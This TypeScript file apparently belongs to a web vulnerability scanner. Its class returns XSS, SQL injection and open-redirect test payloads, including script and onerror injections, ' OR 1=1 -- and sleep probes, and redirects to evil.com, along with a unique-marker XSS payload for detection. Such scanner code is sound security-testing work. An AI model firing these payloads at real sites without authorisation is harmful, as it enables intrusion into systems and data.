export type PayloadType = 'xss' | 'sqli' | 'redirect';

export class PayloadMutator {
  generate(type: PayloadType): string[] {
    switch (type) {
      case 'xss':
        return [
          `<script>alert(1)</script>`,
          `"><script>alert(1)</script>`,
          `'"><img src=x onerror=alert(1)>`,
          `<svg/onload=alert(1)>`,
          `<body onload=alert(1)>`,
        ];

      case 'sqli':
        return [
          `' OR 1=1 --`,
          `" OR 1=1 --`,
          `' OR 'a'='a`,
          `' OR sleep(3) --`,
        ];

      case 'redirect':
        return [
          `https://evil.com`,
          `//evil.com`,
          `///evil.com`,
        ];

      default:
        return [];
    }
  }

  generateMarker(): string {
    return `XSS_${Date.now()}_${Math.random().toString(36).slice(2)}`;
  }

  buildDynamicPayload(marker: string): string {
    return `<img src=x onerror=${marker}>`;
  }
}